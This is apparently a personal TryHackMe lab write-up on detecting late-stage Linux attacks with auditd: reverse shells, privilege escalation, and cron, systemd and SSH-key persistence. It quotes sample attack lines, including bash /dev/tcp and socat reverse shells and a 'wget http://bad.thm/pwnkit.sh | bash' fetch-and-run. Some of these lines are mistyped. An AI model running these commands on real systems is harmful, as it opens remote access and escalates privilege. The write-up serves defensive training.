---
title: Linux threat detection three
platform: TryHackMe
difficulty: Medium
date: 2026-07-29
tags: [Linux Security, logs, persistence, escalation]
summary: A write up of the last stages of an advanced attack on Linux machines and how to detect them
---

# Linux threat detection three


## Reverse shells - T1059
If an attacker gains access to a machine via any method other than SSH, there's a good chance that they will need to establish a reverse shell in order to continue the attack.

|command on the victim|Description|
|---------------------|-----------|
|bash 0i >& /dev/tcp/10.10.10.10/1337 0>&1|Forces the victim to connect to 10.10.10.10:1337 and launch bash for the attacker|
|socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane|Socat alternative to the above command|
|python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash"0'|Python alternative to the above commands|

Detecting reverse shells requires using auditd.
- ausearch -i -x socat: look for suspicious commands like socat
- use it's ppid to find parent process and build process tree
- continue moving up the process tree to confirm its origin

After a reverse shell is established it's usually followed by Dicovery and other stages so listing all commands originating from the spawnned reverse shell by building a process tree is possible:
- ausearch -i -x socat
- ausearch -i --ppid *socat pid* | grep proctitle: lists all its child processes

### Exercises
**Which IP spawned a reverse shell via the TryPingMe app**
searching for the commands used to spawn a reverse shell in the audit logs helps here, using ausearch -if audit.log | grep socat returned the result I needed.
![linux1](/static/images/linux1.png)

## Privilege escalation - TA0004
Privilege escalation is required in most instances of attack where the Inital access was not via exposed SSH. web attacks and exploits often start as low-privilege service users, the goal is to get to the root user, to do this attackers may do the following.
|Preceding Discovery|Privilege Escaalation|
|If uname -a shows an old unpatched Ubuntu 16.04|Attacker will run an exploit like PwnKit "wget http://bad.thm/pwnkit.sh \| bash|
|if find /bin -perm 4000 detect an env binary with the SUID flag|Attacker will use the SUID vulnerability to get root access via /bin/env /bin/bash -p|
|if ls /etc/ssh exposed an unprotected shh-backup-key file|Attacker will try using the file to get root access via: ssh root@127.0.0.1 -i ssh-backup-key|

Detecting Privilege Escalation required knowing how attackers attempt to escalate their privileges. Looking directly for privilege escalation is difficult as their is hundreds of SUID miconfigs and thousands of software vulnerabilites so it requires looking at surrounding events and building a process tree to get a full picture. 

### Exercises
**Which command line was used to look for the pass keyword in files**
First I searched the audit.log for the use of both the find and grep command, after finding a result with the grep command where a2="pass" I knew I was looking at the right log so i grabbed the pid and searched for it to get the full log.
![linux2](/static/images/linux2.png)

**Which command line was used to escalate privileges to root**
Since I found the ppid of the commands being ran I simply searched for that to get all the commands and looked through them where I saw the use ran su root.
![linux3](/static/images/linux3.png)

**Looking at the detected .env file, what was the root password*
this simply required being in the same cwd as the attacker and repeating their commands which are all shown in the previous screenshorts
![linux4](/static/images/linux4.png)

## Startup Persistence - TA0003
Since most Linux machines are mainly servers that run for years without reboot most attackers don't rush to set up Persistence. If an attacker is to set up persistence it is commonly done two ways via Cron and via systemd.

Cron Persistence means using cron jobs, which are similar to scheduled tasks in windows, to run a process on a schedule. An example of this is when APT29 deployed a malware called GoldMax and to ensure it survived reboot a line was added to the victims cron job file: @reboot nohup /home/<user>/.hidden<hidden-dir>/<malware-name> > /dev/null 2&1 &

Systemd Persistence means using the systemd services which hosts the most critical system components such as DS, SSH and web services located inside /lib/systemd/system or /etc/systemd/system folders. With root privilegs an attacker can make their own services. For example the Sandworm group created a "cloud-online" service to enable its GOGETTER MALWARE to run on reboot: 
![gogetter](/static/images/gogetter.png)

Detecting Persitence is easy with these two methods since both cron jobs and systemd services are defined as simple text files which means they can be monitored for changes using auditd. Persistence can also be detected by tracking the creation of related processes, such as crontab and systemcl.

- Monitor changes in cron job files: /etc/crontab, /etc/cron.d\*, /var/spool/cron/\*, /var/spool/crontab/\*
- Monitor changes in systemd folder: /lib/systemd/system/\*, /etc/systemd/system/\*
- Monitor related processes such as: nano /etc/crontab, crontab -e, systemctl start|enable <service>

Example commands:
- ausearch -i -f /etc/systemd
- ausearch -i -x crontab

### Exercises 
**what flag do you get after running the malware as a cronjob**
The first command I run is ausearch -i -x crontab which shows a proctitle=crontab -e command which is suspicious so i grabbed the pid (1311), the name= (crontabs/TMP.P5H675) and the directory (/var/spool/cron)
![linux5](/static/images/linux5.png)
So I went to the directory and found the TMP file got renamed  to root as is what happens with crontab -e. Using cat on the root folder and reading through it I found the persistence technique at the bottom (T1053.003) that works on every reboot
![linux6](/static/images/linux6.png)
After this I simply ran the directory and got the flag
![linux7](/static/images/linux7.png)
**What flag do you get after running the malware persisting as a service**
for this I searched the audit logs using grepping for systemmd and proctitle where I saw nano was being run on systemd as well as a wget command, but after investigation the wget command was for a legitimate framework used by THM
![linux8](/static/images/linux8.png)
the next step for me was to follow the directory and see what I could find, where I found an ASCII file so I used cat to read it and it showed me the location of the malware
![linux9](/static/images/linux9.png)
Next I located the malware, ran it, and answered the question to get the flag
![linux10](/static/images/linux10.png)

## Account Persistence
This involves maintaing Persistence to an account without leaving any malware. How this is done depends on how the attacker entered.

If the attacker gained access via SSH they are likely to create a new user account and add it to a privileged group to then use for ssh again later. This is easy to detect using auditd and building a process tree from user creation events.

Another method is to backdoor the SSH keys (T1098.004) of one of the users and use them for future logins instead of a password. The best detection method is to monitor changes to the ~/.ssh/authorized_keys file

Another method is application Persistence (T1071) where with admin privileges an attacker can add a backdoor to a website and run commands through the backdoor. Because this Persistence lives in the application layer the auditd and system logs often don't see it.

### Exercises
**Which user created and added sudo to group**
using the audit logs and grepping for group showed all the logs realted to adding users to the group where the only user added showing up was acct=koichi.
![linux11](/static/images/linux11.png)
After investigating the account it turns out they were added to the sudo group
![linux12](/stati/images/linux12.png)
**which file was changed to allow SSH key persistence**
Grepping for the word authorized in the auditd logs brings up three events to do with the ssh key folder, one of which is malicious as it is a bash script that contains 0_APPEND meaning the attacker appended their own key to the file
![linux13](/static/images/linux13.png)
Looking inside the file shows the attacker added three persistence keys as they are added without the lines "no-port-forwarding...." as they have full restricted root SSH access and they sit in root
![linux14](/static/images/linux14.png)

## Conclusion
To conclude the linux threat detection series covered Initial Access, Discovery and everything after. It showed how and why Linux machines are targeted and how to detect and attack at all stages using logs and commands.

---

- **Linux threat detection three**
- **TryHackMe**
- **Medium**
- **2026-07-29**
- **Linux Security, Logs, Persistence**
- **A write up of Peristence techniques used against Linux machines and how to detect them**
